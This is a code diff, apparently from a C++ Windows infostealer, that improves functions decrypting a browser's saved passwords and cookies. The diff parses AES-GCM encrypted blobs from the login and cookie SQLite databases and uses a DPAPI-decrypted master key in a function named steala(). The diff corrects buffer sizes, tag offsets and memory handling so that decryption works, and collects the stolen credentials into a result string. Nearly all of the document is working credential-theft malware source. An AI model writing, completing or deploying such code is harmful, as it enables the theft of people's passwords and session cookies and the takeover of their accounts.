@@ -41,103 +41,118 @@ int callback_logindata(void *p_data, int num_fields, char **p_fields, char **p_c
     for(int i =0;i < num_fields; i++){
         //password
         if(i == 2){
-            int encrypted_size = 0;
-            while(p_fields[i][encrypted_size]!='\0'){
+            char *passcode = p_fields[i];
+            //find index of NULL terminator
+            size_t encrypted_size = 0;
+            if(passcode[encrypted_size] != '\0'){
+                while(passcode[encrypted_size+1] != '\0'){
+                    //printf("%c(%02X)-", passcode[encrypted_size], (BYTE)passcode[encrypted_size]);
+                    encrypted_size++;
+                }
+                //Size of the char array is index + 1, since we started at 0 
+                //printf("%c(%02X)-", passcode[encrypted_size], (BYTE)passcode[encrypted_size]);
                 encrypted_size++;
             }
+            //printf("%c(%02X) ***END\n", passcode[encrypted_size], (BYTE)passcode[encrypted_size]);
+            //printf("Size of encrypted string: %d\n", encrypted_size);
             // if size is big enough, we decrypt it using aes gcm mode
-            if(encrypted_size > 31){
+            if(encrypted_size >= 31){
                 size_t ciphertext_size = encrypted_size - 31;
-                BYTE* password = (BYTE*)p_fields[i];
                 BYTE* IV = new BYTE[12];
                 BYTE* tag = new BYTE[16];
+                BYTE* password = (BYTE*)p_fields[i];
                 BYTE* cipher = new BYTE[ciphertext_size];
                 // skip first 3 bytes, parse encrypted_password into IV, cipher, and mac tag
                 for(int j = 0; j < 12; j++){
                     IV[j] = password[j+3];
                 }
-                for(int j = 0; j < encrypted_size; j++){
+                for(int j = 0; j < ciphertext_size; j++){
                     cipher[j] = password[j+15];
                 }
-                size_t tag_offset = ciphertext_size + 15;
+                size_t tag_offset = encrypted_size - 16;
                 for(int j = 0; j < 16; j++){
                     tag[j] = password[j+tag_offset];
                 }
-                //decrypt password
-                aes->Decrypt(IV, 12, cipher, ciphertext_size, tag, 16);
-                if(aes->plaintext != NULL){
-                    BYTE* plaintext = aes->plaintext;
-                    DWORD plaintext_size = aes->ptBufferSize;
-                    insertByteToCharToResultLOL(plaintext, plaintext_size, aes->cookieOrPassword);
+
+                //Decrypt if ciphertext size is not 0, otherwise verify tag
+                if(ciphertext_size){
+                    //decrypt password
+                    if(!aes->Decrypt(IV, 12, cipher, ciphertext_size, tag, 16)){
+                        BYTE* plaintext = aes->plaintext;
+                        DWORD plaintext_size = aes->ptBufferSize;
+                        insertByteToCharToResultLOL(plaintext, plaintext_size, aes->cookieOrPassword);
+                        if(!::HeapFree(GetProcessHeap(), 0, (LPVOID)aes->plaintext)){
+                            printf("Something terrible has happened\n");
+                        }
+                        aes->plaintext = NULL;
+                    }else{
+                        resultStr += aes->cookieOrPassword + "CANNOT DECRYPT\n";
+                    }  
                 }else{
-                    aes->plaintext = NULL;
-                    aes->ptBufferSize = 0;
-                    resultStr += aes->cookieOrPassword + "CANNOT DECRYPT\n";
+                    if(aes->VerifyTag(IV, 12, tag, 16)){
+                        printf("Tag mismatch!!!\n");
+                    }else{
+                        resultStr += aes->cookieOrPassword + "User did not save this password\n";
+                    }
                 }
-                delete tag;
+                
                 delete cipher;
+                delete tag;
                 delete IV;
             } 
         }else
         putInResult(p_col_names[i], p_fields[i]);
     }
+    resultStr += "-------------------------------------------------------------------------\n";
     return 0;
 }
 
 int callback_cookies(void *p_data, int num_fields, char **p_fields, char **p_col_names){
     //parse p_data to aesgcm class
     AESGCM* aes = (AESGCM*)p_data;
+    string temp;
     //print data from SQLDataBase
     for(int i =0;i < num_fields; i++){
         //password
         if(i == 2){
-            int encrypted_size = 0;
-            wprintf(L"Value: ");
-            while(p_fields[i][encrypted_size]!='\0'){
-                encrypted_size++;
+            char *passcode = p_fields[i];
+            size_t encrypted_size = 0;
+            if(passcode[encrypted_size] != '\0'){
+                while(passcode[encrypted_size+1] != '\0'){
+                    printf("%c-", (char)passcode[encrypted_size++]);
+                }
             }
+            printf("\nSize of encrypted string: %d\n", encrypted_size);
             // if size is big enough, we decrypt it using aes gcm mode
-            if(encrypted_size > 31){
+            if(encrypted_size > 31 && (char)passcode[0] == 'v' && (char)passcode[1] == '1' && (char)passcode[2] == '0'){
                 size_t ciphertext_size = encrypted_size - 31;
-                BYTE* password = (BYTE*)p_fields[i];
-                BYTE* IV = new BYTE[12];
-                BYTE* tag = new BYTE[16];
-                BYTE* cipher = new BYTE[ciphertext_size];
-                // skip first 3 bytes, parse encrypted_password into IV, cipher, and mac tag
-                for(int j = 0; j < 12; j++){
-                    IV[j] = password[j+3];
-                }
-                for(int j = 0; j < encrypted_size; j++){
-                    cipher[j] = password[j+15];
-                }
-                size_t tag_offset = ciphertext_size + 15;
-                for(int j = 0; j < 16; j++){
-                    tag[j] = password[j+tag_offset];
-                }
+                BYTE* password = (BYTE*)passcode;
                 //decrypt password
-                aes->Decrypt(IV, 12, cipher, ciphertext_size, tag, 16);
-                if(aes->plaintext != NULL){
+                if(aes->Decrypt(password+3, 12, password+15, ciphertext_size, password+(encrypted_size-16), 16)){
                     BYTE* plaintext = aes->plaintext;
                     DWORD plaintext_size = aes->ptBufferSize;
-                    for(int k = 0; k < plaintext_size; k++){
-                        wprintf(L"%c", (char)plaintext[k]);
+                    insertByteToCharToResultLOL(plaintext, plaintext_size, aes->cookieOrPassword);
+                    if(!::HeapFree(GetProcessHeap(), 0, (LPVOID)plaintext)){
+                        printf("Something terrible has happened\n");
                     }
-                    wprintf(L"\n");
-                }
-                delete tag;
-                delete cipher;
-                delete IV;
-                wprintf(L"Size of value: %d\n", encrypted_size);
+                    plaintext = NULL;
+                    cout << "GOT IT\n" << endl;
+                }else{
+                    cout << "FAILED\n" << endl;
+                    resultStr += aes->cookieOrPassword + "CANNOT DECRYPT\n";
+                }  
             } 
-        }else
-        wprintf(L"%s: %s\n", p_col_names[i], p_fields[i]);
+        }else{
+            putInResult(p_col_names[i], p_fields[i]);
+        }
     }
-    wprintf(L"\n");
+    
     return 0;
 }
 
-std::string steala(){    
+std::string steala(void){    
     if(resultStr.size() != 0){
+        cout << "HI" << endl;
         return resultStr;
     }
     /* Parse encrypted_key, Base64 decode, DPAPI decrypt */
@@ -185,7 +200,7 @@ std::string steala(){
 
     DWORD decrypted_size = decrypted_key.cbData;
     BYTE* decrypted_data = decrypted_key.pbData;
-    
+
     /* Copy database to temp file, read SQL database, AES_GCM decode password */
     AESGCM* aesgcm = new AESGCM(decrypted_data); 
 
